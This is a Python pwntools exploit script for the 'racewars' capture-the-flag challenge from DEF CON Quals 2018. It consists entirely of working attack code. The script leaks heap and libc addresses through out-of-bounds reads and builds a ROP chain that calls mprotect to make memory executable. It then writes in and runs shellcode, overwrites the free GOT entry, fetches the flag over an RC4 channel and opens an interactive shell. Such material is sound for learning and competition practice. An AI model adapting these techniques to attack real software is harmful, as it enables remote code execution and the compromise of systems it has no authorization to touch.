#!/usr/bin/env python2

from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("libc-2.23.so")
e = ELF("./racewars")
#r = process("./racewars")
#r = process("LD_PRELOAD=./libc-2.23.so ./racewars", shell=True)
#r = remote("2f76febe.quals2018.oooverflow.io", 31337)
r = remote("192.168.129.141", 5001)
context.arch = 'amd64'
#r = process("linux_serverx64")
#context.log_level = 'DEBUG'
# first setup our double allocation
def menu():
    r.recvuntil("CHOICE: ")

menu()
r.sendline("1")
r.recvuntil("need?\n")
r.sendline("536870912")

# alloc transmission so it gets allocated on top of our tires
menu()
r.sendline("4")
r.recvuntil("ion? ")
r.sendline("5")

# fill out the rest of the car
menu()
r.sendline("2")
r.sendline("1")
menu()
r.sendline("3")

# set gears of transmission to a high number
for i in xrange(1, 5):
    menu()
    r.sendline("1")
    menu()
    r.sendline(str(i))
    r.recvuntil(": ")
    r.sendline("65535")

#r.interactive()
# now leak mem
def leakb_rel(rel):
    menu()
    r.sendline("4")
    r.recvuntil("modify? ")
    r.sendline(str(rel+1))
    r.recvuntil("is ")
    n = int(r.recvuntil(",")[:-1])
    r.recvuntil("what?: ")
    r.sendline("0")
    r.recvuntil("no)")
    r.sendline("0")
    return chr(n)

def leakq_rel(rel):
    res = ''
    for i in range(0, 8):
        res += leakb_rel(rel+i)
    return u64(res)

#k = leakb_rel(-17)
#print(hex(k))
gears_addr = leakq_rel(-17) - 39
log.info("Gears address: " + hex(gears_addr))

pivot_addr = gears_addr - 145
log.info("Pivot addr: " + hex(pivot_addr))
big_pivot_addr = pivot_addr + 496
log.info("Big Pivot addr: " + hex(big_pivot_addr))
#r.interactive()

def leakq_abs(addr, base):
    return leakq_rel(addr-base)

printf_addr = leakq_abs(e.got["printf"], gears_addr)
libc_base = printf_addr - libc.symbols["printf"]
log.info("Printf @ plt: " + hex(printf_addr))
log.info("Libc base: " + hex(libc_base))
#r.interactive()
def writeb_rel(rel, v):
    menu()
    r.sendline("4")
    r.recvuntil("modify? ")
    r.sendline(str(rel+1))
    r.recvuntil("what?: ")
    r.sendline(str(ord(v)))
    r.recvuntil("no)")
    r.sendline("1")

def writeq_abs(addr, v, base):
    v = p64(v)
    for i in xrange(0, len(v)):
        writeb_rel((addr-base)+i, v[i])

def writeb_abs(addr, v, base):
    writeb_rel((addr-base), v)

pivot_gadget = 0x000000000003a2a7


sc_base = gears_addr + 1000


mini_rop = ''
mini_rop += p64(libc_base + 0x0000000000038288) # pop rax ; ret
mini_rop += p64(big_pivot_addr)
mini_rop += p64(pivot_gadget+libc_base)
for idx in xrange(0, len(mini_rop)):
    writeb_abs(pivot_addr+idx, mini_rop[idx], gears_addr)


ropo = ''
ropo += p64(0x0000000000401e13) # pop rdi; ret
ropo += p64(sc_base & 0xfffff000)
ropo += p64(0x0000000000401e11) # pop rsi ; pop r15 ; ret
ropo += p64(0x2000) 
ropo += p64(0x1337)
ropo += p64(libc_base + 0x0000000000001b8e) # pop rdx ; ret
ropo += p64(7)
ropo += p64(libc_base + libc.symbols["mprotect"])
ropo += p64(sc_base)
log.info("rop chain length: " + str(len(ropo)))
for idx in xrange(0, len(ropo)):
    writeb_abs(big_pivot_addr+idx, ropo[idx], gears_addr)


#shellcode = asm(shellcraft.sh())
shellcode = open("racewars_sc", "rb").read()
for idx in xrange(0, len(shellcode)):
    writeb_abs(sc_base+idx, shellcode[idx], gears_addr)


def KSA(key):
    keylength = len(key)

    S = range(256)

    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % keylength])) % 256
        S[i], S[j] = S[j], S[i]  # swap

    return S

# bug: shouldn't be resetting counter without redoing state
def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]  # swap

        K = S[(S[i] + S[j]) & 0xff]
        yield K

def rc4(S, ptext):
    res = ''
    p = PRGA(S)
    for c in ptext:
        res += chr(ord(c) ^ p.next())
    return res

pivot_gadget = 0x000000000003a2a7
writeq_abs(e.got["free"], pivot_gadget+libc_base, gears_addr) # eax = pivot_addr here
menu()
context.log_level = 'DEBUG'
r.sendline("6")
r.recvuntil("...\n")
r.send(p32(0x1337))
key = u32("jett") ^ 0x1337 # retrieved from binary
log.info("RC4 key: " + hex(key))
S = KSA(p32(key))
fname = "flag"
while len(fname) != 32:
    fname += "\x00"
r.send(rc4(S, fname))
res = r.readn(32)
log.info("Got data back: " + repr(rc4(S, res)))
r.interactive()
